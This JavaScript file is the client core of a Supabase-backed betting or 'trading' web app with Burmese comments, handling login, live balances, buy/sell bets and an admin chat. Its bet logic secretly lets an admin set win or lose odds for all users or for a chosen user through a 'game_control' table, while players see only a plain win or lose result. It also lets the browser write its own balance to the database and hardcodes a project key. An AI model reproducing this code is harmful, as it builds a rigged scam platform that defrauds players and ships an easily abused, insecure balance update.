// assets/js/core.js

/* ==================================================================
   ၁။ SYSTEM SETUP & CONNECTION
   ================================================================== */
const supabaseUrl = 'https://qonmwtjznyrfenikqffk.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFvbm13dGp6bnlyZmVuaWtxZmZrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA3NDQ3NzEsImV4cCI6MjA4NjMyMDc3MX0.OgTzG55xr_zkK8pIRp_S4lPG4eTIHunqz5PP_EPEFrs';

// Safety Check: Supabase Library ရှိမရှိ စစ်မယ် (Error မတက်အောင် ကာကွယ်ခြင်း)
if (typeof supabase === 'undefined') {
    console.error("CRITICAL ERROR: Supabase script is missing in HTML.");
    alert("System Error: Please check your internet or HTML script order.");
} 

const db = supabase.createClient(supabaseUrl, supabaseKey);
console.log("✅ Database Connected via Core.js");

// Global Variables
let myGameUID = null; // 6-digit UID
let myUUID = null;    // Supabase User ID


/* ==================================================================
   ၂။ USER INITIALIZATION (Login & UID Check)
   ================================================================== */
async function initUserSystem() {
    // Session စစ်မယ်
    const { data: { session } } = await db.auth.getSession();
    
    if (!session) {
        // Login မဝင်ထားရင် ဘာမှဆက်မလုပ်ဘူး (Auth.js က handle လုပ်လိမ့်မယ်)
        console.log("Guest Mode: No User Logged In");
        return; 
    }

    myUUID = session.user.id;

    // Profiles table ထဲကနေ 6-digit UID ကို လှမ်းယူမယ်
    const { data: profile } = await db.from('profiles').select('uid').eq('id', myUUID).single();
    
    if (profile) {
        myGameUID = profile.uid;
        console.log("Active Game UID:", myGameUID);
        
        // HTML မှာ UID ပြမယ့်နေရာ (ရှိခဲ့ရင်) ဖော်ပြမယ်
        const uidDisplay = document.getElementById('user-uid-display'); 
        if (uidDisplay) uidDisplay.innerText = myGameUID;

        // Admin နဲ့ချိတ်မယ့် Function တွေ စ run မယ်
        initRealtimeBalance(); 
        initChatSystem();
    }
}

// System စတင်ခြင်း
initUserSystem();


/* ==================================================================
   ၃။ REALTIME BALANCE SYSTEM
   ================================================================== */
async function initRealtimeBalance() {
    fetchBalance(); // လက်ရှိပိုက်ဆံဆွဲမယ်

    // Admin ပြင်လိုက်တာနဲ့ ချက်ချင်းပြောင်းအောင် စောင့်မယ်
    db.channel('public:assets')
        .on('postgres_changes', 
            { event: 'UPDATE', schema: 'public', table: 'assets', filter: `uid=eq.${myGameUID}` }, 
            (payload) => {
                if(payload.new) {
                    updateBalanceUI(payload.new.amount);
                }
            }
        ).subscribe();
}

async function fetchBalance() {
    const { data } = await db.from('assets').select('amount').eq('uid', myGameUID).single();
    if (data) updateBalanceUI(data.amount);
}

function updateBalanceUI(amount) {
    // HTML မှာ <span id="user-balance">...</span> ရှိရမယ်
    const el = document.getElementById('user-balance'); 
    if (el) el.innerText = Number(amount).toLocaleString();
}


/* ==================================================================
   ၄။ TRADING LOGIC (Buy/Sell)
   ================================================================== */

// (A) Buy/Sell ခလုတ်နှိပ်ရင် HTML ကနေ လှမ်းခေါ်မည့် Function
// onclick="handleTradeClick('big')"
window.handleTradeClick = async function(choice) {
    // Input ထဲက ပိုက်ဆံပမာဏကို လှမ်းယူမယ်
    const amountInput = document.getElementById('bet-amount');
    
    // Input မရှိရင် Default 100 နဲ့ သွားမယ်
    const amount = amountInput ? Number(amountInput.value) : 100;

    if (amount <= 0) {
        alert("Please enter a valid amount!");
        return;
    }

    // တကယ်အလုပ်လုပ်မယ့် Function ကို လှမ်းခေါ်မယ်
    await placeBet(amount, choice); 
};

// (B) အနောက်ကွယ်က တွက်ချက်သည့် Function
async function placeBet(betAmount, choice) {
    if (!myGameUID) return alert("System Loading... Please wait.");

    // (1) ပိုက်ဆံလောက်လား စစ်မယ်
    const { data: asset } = await db.from('assets').select('*').eq('uid', myGameUID).single();
    const currentBal = Number(asset?.amount ?? 0);

    if (currentBal < betAmount) return alert("လက်ကျန်ငွေ မလုံလောက်ပါ");

    // (2) Admin Control (Win/Lose) ကို လှမ်းစစ်မယ်
    const { data: controls } = await db.from('game_control').select('*')
        .or(`target_uid.eq.GLOBAL,target_uid.eq.${myGameUID}`);

    // (3) နိုင်/ရှုံး တွက်မယ်
    let result = calculateGameResult(controls); // 'win' or 'lose'

    // (4) ပိုက်ဆံ အတိုး/အလျော့ လုပ်မယ်
    let newBal = result === 'win' ? (currentBal + betAmount) : (currentBal - betAmount);

    // (5) Database Update (Assets)
    await db.from('assets').update({ amount: newBal }).eq('uid', myGameUID);

    alert(`Result: ${result.toUpperCase()}! New Balance: ${newBal}`);
}

// (C) နိုင်/ရှုံး ဖော်မြူလာ
function calculateGameResult(controls) {
    const personal = controls?.find(c => c.target_uid === myGameUID && c.is_active);
    const global = controls?.find(c => c.target_uid === 'GLOBAL' && c.is_active);
    const activeRule = personal || global;

    // Rule မရှိရင် 50/50 Random
    if (!activeRule) return Math.random() > 0.5 ? 'win' : 'lose';

    // Rule ရှိရင် Admin ပေးတဲ့ % အတိုင်းတွက်မယ်
    const chance = Math.random() * 100;
    if (activeRule.mode === 'win') {
        return chance <= activeRule.percentage ? 'win' : 'lose';
    } else {
        return chance <= activeRule.percentage ? 'lose' : 'win';
    }
}


/* ==================================================================
   ၅။ CHAT SYSTEM & UI HANDLERS
   ================================================================== */
async function initChatSystem() {
    const chatBox = document.getElementById('chat-messages-container');
    if (!chatBox) return;

    // စာအဟောင်းများ
    const { data } = await db.from('messages').select('*')
        .eq('uid', myGameUID).order('created_at', { ascending: true });
    
    if (data) {
        chatBox.innerHTML = '';
        data.forEach(msg => appendMessageUI(msg.content, msg.is_admin));
    }

    // စာအသစ်များ
    db.channel('chat_listener')
        .on('postgres_changes', 
            { event: 'INSERT', schema: 'public', table: 'messages', filter: `uid=eq.${myGameUID}` }, 
            (payload) => {
                appendMessageUI(payload.new.content, payload.new.is_admin);
            }
        ).subscribe();
}

// User စာပို့ရန်
window.sendMessage = async function() {
    const input = document.getElementById('chat-input');
    const text = input?.value.trim();
    if (!text) return;

    if (!myGameUID) return alert("Connection lost. Please refresh.");

    await db.from('messages').insert([{
        uid: myGameUID, 
        content: text,
        is_admin: false,
        type: 'text'
    }]);

    input.value = '';
};

// UI ပေါ် စာပြရန်
function appendMessageUI(text, isAdmin) {
    const chatBox = document.getElementById('chat-messages-container');
    if (!chatBox) return;

    const div = document.createElement('div');
    div.className = isAdmin ? 'msg-admin' : 'msg-user'; 
    // Basic Styling in case CSS is missing
    div.style.padding = "8px 12px";
    div.style.margin = "5px";
    div.style.borderRadius = "8px";
    div.style.maxWidth = "80%";
    div.style.alignSelf = isAdmin ? "flex-start" : "flex-end"; 
    div.style.background = isAdmin ? "#333" : "#00c853";
    div.style.color = "#fff";
    
    div.innerText = text;
    chatBox.appendChild(div);
    chatBox.scrollTop = chatBox.scrollHeight;
}

// Plus Button (Attachment)
window.handleAttachment = function() {
    alert("Attachment feature coming soon!"); 
};

// Time Selection Logic
let selectedSeconds = 120;
window.selectTime = function(seconds, btn) {
    selectedSeconds = seconds;
    const allBtns = document.querySelectorAll('.time-btn');
    allBtns.forEach(b => {
        b.style.background = 'transparent';
        b.style.border = '1px solid rgba(255,255,255,0.15)';
        b.classList.remove('active');
    });
    btn.style.background = '#005ED3';
    btn.style.border = '1px solid #005ED3';
    btn.classList.add('active');
};